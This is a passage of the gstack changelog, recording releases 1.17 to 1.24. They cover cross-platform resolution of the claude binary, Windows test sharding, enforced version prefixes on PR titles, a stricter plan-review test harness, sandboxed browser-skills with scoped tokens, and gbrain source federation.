- `browse/src/claude-bin.ts`: thin (~70 LOC) wrapper around `Bun.which()` for cross-platform `claude` binary resolution. Honors `GSTACK_CLAUDE_BIN` / `CLAUDE_BIN` env override (absolute path or PATH-resolvable), and `GSTACK_CLAUDE_BIN_ARGS` / `CLAUDE_BIN_ARGS` arg-prefix (JSON array or scalar). Override values go through `Bun.which()` so `GSTACK_CLAUDE_BIN=wsl` resolves correctly — fixing the bug codex flagged in the fork's 95-LOC reimplementation.
- `scripts/test-free-shards.ts`: enumerates the free test suite, supports stable-hash sharding (FNV-1a), and provides a `--windows-only` filter that scans each test's content for POSIX-bound patterns (`/bin/sh`, `sh -c`, raw `/tmp/`, `chmod`, `xargs`, `which claude`). Adapted from McGluut's fork (190 LOC sharding logic) with the Windows curation filter added by upstream.
- `.github/workflows/windows-free-tests.yml`: separate non-container job that runs `bun run test:windows` on `windows-latest`, plus targeted `browse/test/claude-bin.test.ts` and `test/gstack-paths.test.ts` runs. NOT a matrix entry on the existing Linux-container `evals.yml` (correctly flagged by codex as not a drop-in).
- `test/gstack-paths.test.ts`: 8 unit tests covering all three fallback chains (HOME unset, CLAUDE_PLUGIN_DATA set, GSTACK_HOME wins, etc.).
- `browse/test/claude-bin.test.ts`: 9 unit tests including the override-PATH-resolution case the fork's version got wrong.
- `test/test-free-shards.test.ts`: 14 unit tests covering enumeration, paid-eval filtering, Windows-fragility detection, and stable sharding.
- `test/skill-validation.test.ts`: 3 new invariant tests — private-path leak detector (catches accidental references to maintainer-only files in any SKILL.md or SKILL.md.tmpl) and 2 doc-inventory cross-checks (every skill directory must appear in `AGENTS.md` and `docs/skills.md`).

#### Changed

- 11 SKILL.md.tmpl files migrated off inline `${CLAUDE_PLUGIN_DATA:-...}` or `${GSTACK_HOME:-$HOME/.gstack}` chains: `careful`, `freeze`, `guard`, `unfreeze`, `investigate`, `context-save`, `context-restore`, `learn`, `office-hours`, `plan-tune`, `codex`. Each now sources `bin/gstack-paths` and reads `$GSTACK_STATE_ROOT` (or `$PLAN_ROOT` / `$TMP_ROOT` for codex).
- `codex/SKILL.md.tmpl`: new Step 0.6 "Resolve portable roots" sources `gstack-paths`. Replaces hardcoded `~/.claude/plans/*.md` with `"$PLAN_ROOT"/*.md` (3 sites) and `mktemp /tmp/codex-*-XXXXXX.txt` with `mktemp "$TMP_ROOT/codex-*-XXXXXX.txt"` (3 sites). Skill now works in Claude Code plugin installs without modification.
- `browse/src/security-classifier.ts`: routes 2 hardcoded `spawn('claude', ...)` calls (version probe at :396, inference call at :496) through `resolveClaudeCommand()`. Honors `GSTACK_CLAUDE_BIN` override; degrades gracefully when claude unavailable.
- `scripts/preflight-agent-sdk.ts`: replaces `execSync('which claude')` with `resolveClaudeBinary()`. Cross-platform, no shell dependency.
- `test/helpers/providers/claude.ts`: `available()` and `run()` both go through `resolveClaudeCommand()`. The previous `spawnSync('sh', ['-c', 'command -v claude'])` was a Windows blocker on its own.
- `test/helpers/agent-sdk-runner.ts`: `resolveClaudeBinary()` now delegates to the shared resolver.
- `AGENTS.md`: rewrote the skill table from 21 entries to 40+, organized by category (plan reviews, implementation, release, operational, browser, safety). `/debug` → `/investigate`. Stale `<5s` `bun test` claim dropped — there's no realistic universal claim to make about test suite duration with periodic + gate + free tiers all in play.
- `docs/skills.md`: added 11 missing skills to the inventory table (`/plan-devex-review`, `/devex-review`, `/plan-tune`, `/context-save`, `/context-restore`, `/health`, `/landing-report`, `/benchmark-models`, `/pair-agent`, `/setup-gbrain`, `/make-pdf`).
- `package.json`: 2 new scripts. `test:free` runs the full free suite via the sharding script. `test:windows` runs the curated Windows-safe subset. Version bump `1.15.0.0` → `1.24.0.0`.
- `VERSION`: `1.15.0.0` → `1.24.0.0`. Workspace-aware queue at /ship time: v1.16.0.0 claimed by `garrytan/gbrowser-unleashed` (PR #1253), v1.17.0.0 by `garrytan/setup-gbrain-run` (PR #1234), v1.19.0.0 by `garrytan/browserharness` (PR #1233), v1.21.1.0 by `garrytan/pty-plan-mode-e2e` (PR #1255). This branch claims the next available MINOR slot.

#### Fixed

- `GSTACK_CLAUDE_BIN=wsl` (or any PATH-resolvable command) now actually resolves the binary. The McGluut fork's `claude-bin.ts` only handled absolute-path overrides; bare commands silently returned null. The Bun.which-based wrapper feeds the override through PATH lookup, fixing the documented use case.
- The `<5s` `bun test` claim in `AGENTS.md` is gone. With the slim-preamble harness from v1.15.0.0 plus the new tests added here, free-suite runtime varies; no realistic universal claim to make.

#### Follow-up TODOs (codex-flagged, deferred)

- **Merge-time version-slot freshness recheck.** Current `bin/gstack-next-version` + `scripts/compare-pr-version.ts` queue protection triggers on PR events touching version files. If another PR lands AFTER our gate fires, our claimed slot can go stale without an automatic recheck. P3 follow-up.
- **POSIX-bound test surfaces for full Windows parity.** 25 tests are excluded from the curated Windows lane via the `WINDOWS_FRAGILE_PATTERNS` scan in `scripts/test-free-shards.ts`. Concrete examples: `test/ship-version-sync.test.ts:72` hardcodes `/bin/bash`, `test/helpers/providers/claude.ts:22` (now fixed in this release), `package.json:12` build step shells out to `bash`/`chmod`. Porting these is the gap between "curated Windows lane" and "full Windows parity." P4 follow-up.
- **Native PowerShell setup support.** `setup` is bash + symlink heavy at `setup:404`. v1.24.0.0 documents Git Bash / MSYS as the supported Windows install path in `AGENTS.md`. A native PowerShell port closes the last off-the-shelf-for-Windows gap. P4 follow-up.

#### For contributors

- Hardening direction credited to the McGluut fork: <https://github.com/mcgluut/gstack>. The Bun.which-based resolver is upstream's adaptation of the cross-platform binary lookup the fork implemented in `claude-bin.ts`; the path-portability helper is upstream's factoring of the `${CLAUDE_PLUGIN_DATA:-...}` chain the fork inlined per-skill. The curated Windows test job is upstream's reading of what `test-free-shards.ts` was reaching toward, applied with explicit attention to which surfaces are actually Windows-safe today.

## [1.23.0.0] - 2026-04-30

## **Every PR title now starts with `vX.Y.Z.W`. `/ship`, `/document-release`, and the GitHub Action all enforce it.**

The format was already documented in `/ship` Step 19, but a "leave custom titles alone" loophole meant a PR opened without a version prefix would never get one — and `/document-release` never touched the title at all, so a doc-release VERSION bump silently left the PR pointing at the old version. This release closes both gaps. The rule lives in one place now (`bin/gstack-pr-title-rewrite.sh`), all three callers shell out to it, and a free `bun test` locks in the four branches.

### The numbers that matter

Numbers come from `git diff --shortstat origin/main..HEAD` and `bun test test/pr-title-rewrite.test.ts` on a clean tree.

| Metric | Δ |
|---|---|
| Net branch size vs main | +210 / −36 lines (5 files + 2 new) |
| New helper script | **bin/gstack-pr-title-rewrite.sh** (40 lines, single source of truth) |
| New unit tests added | **+9** (test/pr-title-rewrite.test.ts) |
| Unit suite runtime | **402ms** (free-tier, runs on every push) |
| Loopholes closed | **3** (ship Step 19, document-release Step 9, pr-title-sync.yml) |
| Reviewers run on this PR | plan-eng-review (CLEARED) + adversarial (Claude subagent) |

### What this means for builders

PR titles are now a deterministic function of the VERSION file, no matter how the PR got created. Open one via the web UI with `feat: my thing` and the next push of a VERSION bump turns it into `v1.23.0.0 feat: my thing`. Run `/ship` from a stale branch where Step 12's queue-drift detection rebumps to a higher version and the title moves with it. Run `/document-release`, bump VERSION at Step 8, and the PR title now follows along instead of staying at the previous version.

The helper itself rejects malformed VERSION values (anything outside `^[0-9]+(\.[0-9]+)*$`) with exit code 2, uses a literal `case` prefix match instead of bash's pattern-matching `#` operator (so a hypothetical VERSION containing glob metacharacters can't silently mismatch), and is idempotent — applying it twice yields the same result.

### Itemized changes

#### Added

- `bin/gstack-pr-title-rewrite.sh`: shared helper. Takes `<NEW_VERSION>` + `<CURRENT_TITLE>`, prints the corrected title on stdout. Three cases: already correct (no-op), different version prefix (replace), no prefix (prepend). Validates NEW_VERSION shape at entry. Used by `/ship`, `/document-release`, and the GitHub Action.
- `test/pr-title-rewrite.test.ts`: 9 deterministic tests covering already-correct, different-prefix, different-prefix-length, no-prefix, plain-words-not-stripped, single-segment-not-stripped, missing-args, malformed-VERSION rejection, and idempotence. Free-tier, runs on every `bun test`.

#### Changed

- `ship/SKILL.md.tmpl` Step 19: idempotency block now always rewrites titles to start with `v$NEW_VERSION` — no more "custom title kept intentionally" escape hatch. Shells out to `bin/gstack-pr-title-rewrite.sh` for the rule. Adds a post-edit self-check that re-fetches the title and retries once if the edit didn't stick.
- `ship/SKILL.md.tmpl` create-PR snippets (lines 867 and 876): inline comment makes the `v$NEW_VERSION` requirement unmissable when reading the step.
- `document-release/SKILL.md.tmpl` Step 9: new "PR/MR title sync" sub-step calls the same helper after the body update. Catches the case where Step 8 bumped VERSION after `/ship` had already created the PR — title follows VERSION instead of going stale.
- `.github/workflows/pr-title-sync.yml`: drops the "eligible only if already prefixed" gate. Sources the helper, rewrites unconditionally on every VERSION change. Defense-in-depth backstop for PRs opened outside the skills (manual `gh pr create`, web UI). Uses `env:` for `OLD_TITLE` so YAML expression injection can't reach `run:`.

#### For contributors

- The helper is a regular `bin/` script with `set -euo pipefail`, no external deps beyond bash + sed. Slots into the existing pattern alongside `bin/gstack-config`, `bin/gstack-slug`, `bin/gstack-next-version`.
- Test coverage gates this — any future change to the rule has to update the test fixtures or the suite goes red.

## [1.21.1.0] - 2026-04-28

## **plan-ceo-review smoke tightens. The "agent skips Step 0 and ships a plan" regression now fails the gate.**

The v1.15.0.0 real-PTY harness shipped with a smoke that accepted either `'asked'` or `'plan_ready'` as success. That OR was too lax for `/plan-ceo-review` specifically: the skill template mandates Step 0A premise challenge plus Step 0F mode selection BEFORE any plan write, so reaching `plan_ready` first IS the regression. This release tightens the assertion to `'asked'` only for that smoke, and refactors the runner so the contract is testable in <1s instead of $0.50 of stochastic PTY.

### The numbers that matter

Numbers come from `git diff --shortstat origin/main..HEAD` and `bun test test/helpers/claude-pty-runner.unit.test.ts` on a clean tree.

| Metric | Δ |
|---|---|
| Net branch size vs main | +162 / −65 lines (3 files) |
| New unit tests added | **+24** (claude-pty-runner.unit.test.ts) |
| Unit suite runtime | **14ms** (deterministic, free-tier) |
| Real-PTY gate runs verified | **4 clean PTY runs** (3 lock-in + 1 post-refactor) |
| Outcome assertions covered | **5/5** (was 3/5; `plan_ready` is now FAIL for plan-ceo) |
| Reviewers run on this PR | plan-eng-review (CLEARED) + codex consult + 2 specialists + adversarial |

### What this means for builders

Three new classes of harness regression are now caught deterministically in the free tier instead of waiting on a $0.50 stochastic PTY run. The classifier is extracted into a pure `classifyVisible()` function so reordering branches in the polling loop fails the unit tests instead of silently shipping. Permission dialogs (which render numbered lists) are filtered out of the `'asked'` classification so a permission prompt cannot pose as a Step 0 skill question. The bare phrase `Do you want to proceed?` no longer triggers permission detection on its own — it now requires a file-edit context co-trigger, so a skill question that contains the phrase isn't mis-classified.

For `/plan-ceo-review` specifically: any future preamble slim-down or template edit that lets the agent skip Step 0 and write a plan will fail the gate before the PR ships. Pull, run `bun test`, and the harness layer is provably tighter without you having to spend a token.

### Itemized changes

#### Added

- `test/helpers/claude-pty-runner.unit.test.ts`: 24 deterministic tests covering `isPermissionDialogVisible` (with the new co-trigger contract), `isNumberedOptionListVisible`, `parseNumberedOptions`, and the new `classifyVisible()` runtime path. Free-tier, runs on every `bun test`.
- `classifyVisible(visible)` in `claude-pty-runner.ts`: pure classifier extracted from the polling loop. Returns `{ outcome, summary } | null`. Branch order: silent_write → plan_ready → asked → null (with permission-dialog filter). Live-state branches (process exited, "Unknown command") stay in the runner.
- `TAIL_SCAN_BYTES = 1500` exported constant. Shared between `runPlanSkillObservation` and the routing test's nav loop so tuning stays in sync.
- `env?: Record<string, string>` option on `runPlanSkillObservation`, threaded to `launchClaudePty`. Plumbing for future env-driven test isolation (gstack-config does not yet honor env overrides; tracked as post-merge follow-up).

#### Changed

- `test/skill-e2e-plan-ceo-plan-mode.test.ts`: assertion narrowed from `['asked', 'plan_ready']` to `'asked'` only. Failure message now branches on `outcome` (plan_ready vs timeout vs silent_write) with a tailored diagnosis line, and references skill-template section names instead of line numbers (durable to template edits).
- `isPermissionDialogVisible`: bare `Do you want to proceed?` now requires a file-edit context co-trigger (`Edit to <path>` or `Write to <path>`). Other clauses (`requested permissions to`, `allow all edits`, `always allow access to`, `Bash command requires permission`) remain unconditional.
- `test/skill-e2e-plan-ceo-mode-routing.test.ts`: replaces the local `1500` magic number with the shared `TAIL_SCAN_BYTES` constant.

#### For contributors

- The runner change is additive and the existing sibling smokes (`plan-eng`, `plan-design`, `plan-devex`, `plan-mode-no-op`) keep their loose `['asked', 'plan_ready']` assertion. Their behavior is unchanged.
- Post-merge follow-ups captured in `TODOS.md`: per-finding AskUserQuestion count assertion (V2), env-driven gstack-config overrides (so `QUESTION_TUNING=false` actually isolates the test), path-confusion hardening on `SANCTIONED_WRITE_SUBSTRINGS`.

## [1.20.0.0] - 2026-04-28

## **Browser-skills land. `/scrape <intent>` first call drives the page; second call runs the codified script in 200ms.**

Browser-skills are deterministic Playwright scripts that run as standalone Bun processes via `$B skill run`. They live in three storage tiers (project > global > bundled), get a per-spawn scoped capability token, and ship with `_lib/browse-client.ts` so each skill is fully self-contained. The bundled reference is `hackernews-frontpage` — try `$B skill run hackernews-frontpage` and you get the HN front page as JSON in 200ms.

The agent authors them. `/scrape <intent>` is the single entry point for pulling page data — it matches existing skills via the `triggers:` array on first call, or drives `$B goto`/`$B html`/etc. on a brand-new intent and returns JSON. After a successful prototype, `/skillify` codifies the flow: it walks back through the conversation, extracts the final-attempt `$B` calls (no failed selectors, no chat fragments), synthesizes `script.ts` + `script.test.ts` + a captured fixture, stages everything to `~/.gstack/.tmp/skillify-<spawnId>/`, runs the test there, and asks before renaming into the final tier path. Test failure or rejection: `rm -rf` the temp dir, no half-written skill ever appears in `$B skill list`. Next `/scrape` with a matching intent routes via `$B skill list` + `$B skill run <name>`. ~30s prototype becomes ~200ms forever after.

Mutating-flow sibling `/automate` is tracked as P0 in `TODOS.md` for the next release. Scraping is the safer wedge to validate the skillify pattern (failure mode: wrong data); mutating actions need the per-step confirmation gate that `/automate` adds on top.

The architecture sidesteps the in-daemon isolation problem by running skill scripts *outside* the daemon as standalone Bun processes. Each script gets a per-spawn scoped capability token bound to the read+write command surface; the daemon root token never leaves the harness. Two token policies share the same registry but enforce independently: `tabPolicy: 'shared'` (default for skill spawns) is permissive on tab access — a skill can drive any tab, gated only by scope checks and rate limits. `tabPolicy: 'own-only'` (pair-agent over the ngrok tunnel) is strict — the token can only access tabs it owns, must `newtab` first to get a tab to drive, can't reach the user's natural tabs. Trust boundaries are at the daemon, not in process-side env scrubbing.

### What you can now do

- **Run a bundled skill:** `$B skill run hackernews-frontpage` returns JSON.
- **Scrape with one verb:** `/scrape latest hacker news stories`. First call matches the bundled skill via the `triggers:` array and runs in 200ms. New intent? It prototypes via `$B`, returns JSON, and suggests `/skillify`.
- **Codify a prototype:** `/skillify` walks back through the conversation, finds the last `/scrape` result, synthesizes the script + test + fixture, stages to a temp dir, runs the test, and asks before committing to `~/.gstack/browser-skills/<name>/`.
- **List what's available:** `$B skill list` walks three tiers (project > global > bundled) and prints the resolved tier inline.
- **Test a skill against a fixture:** `$B skill test hackernews-frontpage` runs the bundled `script.test.ts` against a captured HTML snapshot, no live network.
- **Read a skill's contract:** `$B skill show hackernews-frontpage` prints SKILL.md.
- **Tombstone a user-tier skill:** `$B skill rm <name> [--global]` moves it to `.tombstones/<name>-<ts>/`. Bundled skills are read-only.

### The numbers that matter

Source: 155 unit assertions across `browse/test/{skill-token,browse-client,browser-skills-storage,browser-skill-commands,browser-skill-write,tab-isolation,server-auth}.test.ts`, `browser-skills/hackernews-frontpage/script.test.ts`, and `test/skill-validation.test.ts`. Plus 5 gate-tier E2E scenarios in `test/skill-e2e-skillify.test.ts`. All free-tier tests pass in under two seconds; the gate-tier E2E adds ~$5 to a CI run.

| Surface | Shape |
|---|---|
| Latency on a codified intent | ~200ms (vs ~30s prototype on first call) |
| New `$B` command | `skill` (5 subcommands: list, show, run, test, rm) |
| New gstack skills | 2 (`/scrape`, `/skillify`); `/automate` tracked as P0 in TODOS |
| New modules | 5 (`browse-client.ts`, `browser-skills.ts`, `browser-skill-commands.ts`, `skill-token.ts`, `browser-skill-write.ts`) |
| Bundled reference skills | 1 (`hackernews-frontpage`) |
| Storage tiers | 3 (project > global > bundled, first-wins) |
| SDK distribution model | sibling-file: each skill ships `_lib/browse-client.ts` (~3KB, byte-identical to canonical) |
| Daemon-side capability default | scoped session token, `read+write` only (no `eval`/`js`/`cookies`/`storage`) |
| Process-side env default | scrubbed: drops $HOME, $PATH user-paths, anything matching TOKEN/KEY/SECRET, AWS_*, OPENAI_*, GITHUB_*, etc. |
| Tab access policy | `'shared'` (skill spawns) = permissive, gated by scope only. `'own-only'` (pair-agent tunnel) = strict ownership for every read + write. |
| Atomic-write contract | temp-dir-then-rename via `browse/src/browser-skill-write.ts`. Test fail OR approval reject = `rm -rf` the temp dir. Never a half-written skill on disk. |

### What this means for builders

The compounding loop is closed. The first time you ask the agent to scrape a page, it pays the prototype cost. The second time on the same intent (rephrased or not), it runs the codified script in 200ms. Multiply across every recurring data-pull task you have, release-notes scraping, leaderboard checks, dashboard captures, and the time savings compound across sessions.

The agent-authoring contract is tight: `/skillify` extracts only the final-attempt `$B` calls from the conversation (no failed selectors, no chat fragments leak into the on-disk artifact), writes to a temp dir, runs the auto-generated `script.test.ts` there, and only commits on test pass + your approval. If anything fails, the temp dir vanishes, no broken skill ever appears in `$B skill list`.

Mutating flows (form fills, click sequences, multi-step automations) ship next as `/automate` (P0 in `TODOS.md`). Same skillify machinery, different trust profile: per-mutating-step confirmation gate when running non-codified, unattended once committed. Scraping's failure mode is benign (wrong data) and mutation's isn't (unintended writes); the staged rollout validates the skillify pattern with the safer half first.

Pair-agent operators get the same isolation guarantees they had before. The dual-listener tunnel architecture is intact: a remote agent over ngrok can't read or write tabs the local user is using. Tunnel tokens get `tabPolicy: 'own-only'`, must `newtab` first to drive a tab, and only the 26-command tunnel allowlist is reachable.

### Itemized changes

#### Added — `$B skill` runtime

- `$B skill list|show|run|test|rm <name?>`. Five subcommands. List walks 3 tiers (project > global > bundled) and prints the resolved tier inline so "why did it run that one?" is never a debugging mystery. Run mints a per-spawn scoped capability token, spawns `bun run script.ts -- <args>` with cwd locked to the skill dir, captures stdout (1MB cap) and stderr, and revokes the token on exit.
- `browse/src/browse-client.ts`. Canonical SDK (~250 LOC). Reads `GSTACK_PORT` + `GSTACK_SKILL_TOKEN` from env first (set by `$B skill run`), falls back to `<project>/.gstack/browse.json` for standalone debug runs. Convenience methods cover the read+write surface: goto, click, fill, text, html, snapshot, links, forms, accessibility, attrs, media, data, scroll, press, type, select, wait, hover, screenshot. Low-level `command(cmd, args)` escape hatch for anything else.
- `browse/src/browser-skills.ts`. Three-tier storage helpers. `listBrowserSkills()` walks project > global > bundled (first-wins), parses SKILL.md frontmatter, no INDEX.json. `readBrowserSkill(name)` does the same for a single name. `tombstoneBrowserSkill(name, tier)` moves a skill into `.tombstones/<name>-<ts>/` for recoverability.
- `browse/src/skill-token.ts`. Wraps `token-registry.createToken/revokeToken` with skill-specific clientId encoding (`skill:<name>:<spawn-id>`), read+write defaults, and `tabPolicy: 'shared'`. TTL = spawn timeout + 30s slack.
- `browser-skills/hackernews-frontpage/`. Bundled reference skill (SKILL.md, script.ts, _lib/browse-client.ts, fixtures/hn-2026-04-26.html, script.test.ts). Smallest interesting browser-skill: scrapes HN front page, returns 30 stories as JSON, no auth, stable HTML.

#### Added — `/scrape` + `/skillify` gstack skills

- `scrape/SKILL.md.tmpl` + generated `scrape/SKILL.md`. `/scrape <intent>` is one entry point with three paths: match (intent matches an existing skill's `triggers:` → `$B skill run <name>` in 200ms), prototype (drive `$B` primitives, return JSON, suggest `/skillify`), refusal (mutating intents route to `/automate`). Match decision lives in the agent, not the daemon, no new code in `browse/src/`, no expanded daemon command surface.
- `skillify/SKILL.md.tmpl` + generated `skillify/SKILL.md`. 11-step flow: provenance guard (walk back ≤10 turns for a bounded `/scrape` result, refuse if cold), name + tier + trigger proposal via `AskUserQuestion`, synthesize `script.ts` from final-attempt `$B` calls only, capture fixture, write `script.test.ts`, copy canonical SDK byte-identical to `_lib/browse-client.ts`, write SKILL.md frontmatter (`source: agent`, `trusted: false`), stage to temp dir, run `$B skill test`, approval gate, atomic rename to final tier path.
- `browse/src/browser-skill-write.ts`. Atomic-write helper. `stageSkill()` writes files to `~/.gstack/.tmp/skillify-<spawnId>/<name>/` with restrictive perms. `commitSkill()` does an atomic `fs.renameSync` into the final tier path with `realpath`/`lstat` discipline (refuses to follow symlinked staging dirs, refuses to clobber existing skills). `discardStaged()` is the cleanup path for test failures and approval rejections. `rm -rf` is idempotent and bounded to the per-spawn wrapper. `validateSkillName()` enforces lowercase letters/digits/dashes only, no `..` or path-escape characters.

#### Trust model — scoped tokens

Every spawned skill gets its own scoped token. The shape:

- **Capability scope.** Read + write only by default. No `eval`, `js`, `cookies`, `storage`. Single-use clientId encodes skill name + spawn id. Revoked when the spawn exits or times out (TTL = timeout + 30s slack).
- **Process env.** `trusted: true` frontmatter passes `process.env` minus `GSTACK_TOKEN`. `trusted: false` (default) drops everything except a minimal allowlist (LANG, LC_ALL, TERM, TZ) and pattern-strips secrets (TOKEN/KEY/SECRET/PASSWORD/AWS_*/ANTHROPIC_*/OPENAI_*/GITHUB_*).
- **Tab access policy.** `tabPolicy: 'shared'` (skill spawns, default scoped clients): permissive, can read or write any tab, gated only by scope checks + rate limits. `tabPolicy: 'own-only'` (pair-agent over the tunnel): strict, the token can only access tabs it owns. The two policies enforce independently in `browser-manager.ts:checkTabAccess`. The capability gate already constrains what shared tokens can do; tab ownership only matters for pair-agent isolation.

#### Changed

- `browse/src/commands.ts` registers `skill` as a META command.
- `browse/src/server.ts` threads the local listen port (`LOCAL_LISTEN_PORT`) to meta-command dispatch so `$B skill run` knows which port to point spawned scripts at. The tab-ownership gate predicate at the dispatcher fires for `tabPolicy === 'own-only'` only; shared tokens skip it.
- `browse/src/browser-manager.ts:checkTabAccess` keys on `options.ownOnly`. Shared tokens and root pass unconditionally; own-only tokens require ownership for every read and write.
- `browse/src/meta-commands.ts` dispatches `skill` to `handleSkillCommand`.
- `BROWSER.md` rewritten to a complete reference: 1,299 lines, 26 sections covering the productivity loop, browser-skills runtime, domain-skills, pair-agent dual-listener, sidebar agent + terminal PTY, security stack L1-L6, full source map.
- `docs/designs/BROWSER_SKILLS_V1.md` adds the design for the productivity loop's four contracts (provenance guard, synthesis input slice, atomic write, full test coverage). Phase table organized into 1, 2a, 2b, 3, 4.
- `TODOS.md` lists `/automate` as P0 above the existing `PACING_UPDATES_V0` entry.

#### Tests

- `browse/test/browser-skill-write.test.ts` — 34 assertions covering the atomic-write contract: stage validation, file-path escape rejection, atomic rename, clobber refusal, symlink refusal, idempotent discard, end-to-end happy + failure paths.
- `browse/test/tab-isolation.test.ts` — 9 assertions on `checkTabAccess` with explicit shared-vs-own-only coverage: shared agents can read/write any tab; own-only agents can only access their own claimed tabs.
- `browse/test/server-auth.test.ts` — source-shape regression that fails if a future refactor reintroduces `WRITE_COMMANDS.has(command) ||` into the tab-ownership gate predicate.
- `test/skill-validation.test.ts` extends to cover bundled browser-skills: each must have SKILL.md + script.ts + _lib/browse-client.ts (byte-identical to canonical) + script.test.ts, with frontmatter satisfying the host/triggers/args contract.
- `test/skill-e2e-skillify.test.ts` — 5 gate-tier E2E scenarios (`claude -p` driven, deterministic against local file:// fixtures): match path routes to bundled skill, prototype path drives `$B` and emits JSON, skillify happy writes complete skill tree, provenance refusal leaves nothing on disk, approval-gate reject removes the temp dir.
- `test/helpers/touchfiles.ts` registers all 5 new E2E entries with deps on `scrape/**`, `skillify/**`, `browse/src/browser-skill-write.ts`, plus the runtime modules.

#### For contributors

- The browser-skill SKILL.md frontmatter has a hard contract enforced by `parseSkillFile()` and `test/skill-validation.test.ts`. Required: `host` (string), `triggers` (string list), `args` (mapping list). Optional: `trusted` (bool, defaults false), `version`, `source` (`human`/`agent`), `description`.
- The canonical SDK at `browse/src/browse-client.ts` and the sibling at `browser-skills/hackernews-frontpage/_lib/browse-client.ts` MUST be byte-identical. The skill-validation test fails the build otherwise. When the canonical SDK changes, update every bundled skill's `_lib/` copy. Agent-authored skills via `/skillify` get a freshly-copied SDK at synthesis time, so they're frozen at the version they were authored against (no drift possible).
- The atomic-write helper enforces "no half-written skills." Always call `stageSkill` → run tests → `commitSkill` (success) OR `discardStaged` (failure). Never write directly to the final tier path. The helper's `validateSkillName` is the only naming gate, keep it tight (lowercase letters/digits/dashes, ≤64 chars, no consecutive dashes, no leading digit).
- `checkTabAccess` policy: `ownOnly` is the only signal that constrains access. `isWrite` stays in the signature for callers that want to log or branch elsewhere, but doesn't gate the decision. Adding new policy axes (e.g., per-skill tab quotas) belongs in `docs/designs/`, not as a sneaky `isWrite` overload.
- `/automate` and the Phase 4 follow-ups (Bun runtime distribution, OS FS sandbox, fixture-staleness detection) are tracked in `docs/designs/BROWSER_SKILLS_V1.md` and `TODOS.md`. The `/automate` skill reuses `/skillify` and `browser-skill-write.ts` as-is; new code is the per-mutating-step confirmation gate.

## [1.17.0.0] - 2026-04-26

## **Your gstack memory now actually lives in gbrain.**

For everyone who ran `/setup-gbrain` in the last month and noticed `gbrain search` couldn't find their CEO plans, learnings, or retros: that's because Step 7 wrote a placeholder `consumers.json` with `status: "pending"` and called it done. The HTTP endpoint that placeholder pointed at was never built on the gbrain side. This release scraps that approach and uses the gbrain v0.18.0 federation surface (`gbrain sources` + `gbrain sync`) instead.

After upgrading, `/setup-gbrain` adds a `git worktree` of your brain repo, registers it as a federated source on your gbrain (Supabase or PGLite), and runs an initial sync. Subsequent gstack skill end-of-run cycles also run `gbrain sync` so new artifacts land in the index automatically. Local-Mac only. No cloud agent required. `/gstack-upgrade` runs a one-shot migration for existing users.

### Verify after upgrade

```bash
gbrain sources list --json | jq '.sources[] | {id, page_count, federated}'
# Expect: two entries, your default brain plus a "gstack-brain-{user}"
# entry, both federated=true.

gbrain search "ethos" --source gstack-brain-{user} | head -5
# Expect: hits from your gstack repo content (readme, ethos, designs, etc).
```

### What shipped

`bin/gstack-gbrain-source-wireup` is the new helper. It derives a per-user source id from `~/.gstack/.git`'s origin URL (with multi-fallback to `~/.gstack-brain-remote.txt` and a `--source-id` flag), creates a detached `git worktree` at `~/.gstack-brain-worktree/`, registers it as a federated source on gbrain, runs initial backfill, and supports `--strict` (Step 7 strictness), `--uninstall` (full teardown including future-launchd plist), and `--probe` (read-only state inspection). All idempotent. The helper depends on `jq` (transitive via `gstack-gbrain-detect`).

The helper locks the database URL at startup (precedence: `--database-url` flag > `GBRAIN_DATABASE_URL`/`DATABASE_URL` env > read once from `~/.gbrain/config.json`) and exports it as `GBRAIN_DATABASE_URL` for every child `gbrain` invocation. This means external rewrites of `~/.gbrain/config.json` mid-sync (e.g., a concurrent `gbrain init --non-interactive` running in another workspace) cannot redirect the wireup at a different brain. Per gbrain's `loadConfig()`, env-var URLs override the file. Step 7 of `/setup-gbrain` reads the URL out of `config.json` once and passes it explicitly via `--database-url`, so the wireup is robust against config flips during the seconds-to-minutes sync window.

`/setup-gbrain` Step 7 now invokes the helper with `--strict` after `gstack-brain-init`. `/gstack-upgrade` invokes the helper without `--strict` via `gstack-upgrade/migrations/v1.12.3.0.sh` so missing/old gbrain is a benign skip during batch upgrade. `bin/gstack-brain-restore` invokes the helper after the initial clone so a 2nd Mac gets the wireup automatically. `bin/gstack-brain-uninstall` invokes `--uninstall` plus removes legacy `consumers.json`.

`bin/gstack-brain-init` drops 60 lines of dead consumer-registration code (the HTTP POST block, the `consumers.json` writer, the chore commit). `bin/gstack-brain-restore` drops the 18-line `consumers.json` token-rehydration block (the only consumer that used it never had real tokens). `bin/gstack-brain-consumer` is marked deprecated in its header docstring; removal in v1.18.0.0 after one cycle of grace.

`test/gstack-gbrain-source-wireup.test.ts` is new: 13 unit tests with a fake `gbrain` binary on `$PATH` covering fresh-state registration, idempotent re-runs, drift recovery (gbrain has no `sources update`, only `remove + add`), `--strict` failure modes, source-id fallback chain (`.git` → remote-file → flag), `--probe` non-mutation, sync errors, and `--uninstall`.

### The numbers that matter

These are reproducible on any machine after upgrade. Run the verify commands above to see your own delta.

| Metric | Before (v1.16.0.0) | After (v1.17.0.0) |
|---|---|---|
| `gbrain sources list` size | 1 (default `/data/brain`) | 2 (default + `gstack-brain-{user}`) |
| `consumers.json` status | `"pending"`, ingest_url `""` | file deleted from new installs |
| Manual steps to wire up | 4 (clone + sources add + sync + cron) | 0, automatic in Step 7 |
| Helper test coverage | 0 unit tests | 13 unit tests (`bun test test/gstack-gbrain-source-wireup.test.ts`) |
| `bin/gstack-brain-init` size | 363 lines | 300 lines (60 lines of dead code removed) |

Local Mac is the producer of artifacts and the worktree advances automatically with `~/.gstack/`'s commits. Cross-machine sync runs through GitHub via the existing `gstack-brain-sync --once` push hook. No new cron infrastructure needed today; when gbrain v0.21 code-graph features ship, the helper's `--enable-cron` flag is a clean extension.

### What this means for builders

Your gstack memory is searchable now. Run a CEO plan review or office-hours session, sync runs at skill-end automatically, and `gbrain search` finds the plan content from any gbrain client (this Claude Code session, future Macs, optional cloud agents like OpenClaw). One source of truth across machines. The placeholder is dead.

### For contributors

- `bin/gstack-brain-consumer` is deprecated in this release; removal in v1.18.0.0.
- The `gbrain_url` and `gbrain_token` config keys are now no-ops. They remain readable for one cycle for back-compat, removed in v1.18.0.0.
- Three pre-existing test failures on this branch (`gstack-config gbrain keys > GSTACK_HOME overrides real config dir`, `no compiled binaries in git > git tracks no files larger than 2MB`, `Opus 4.7 overlay — pacing directive`) were verified to fail on the base branch too. Out of scope for this PR; flagged for a follow-up.

## [1.16.0.0] - 2026-04-28

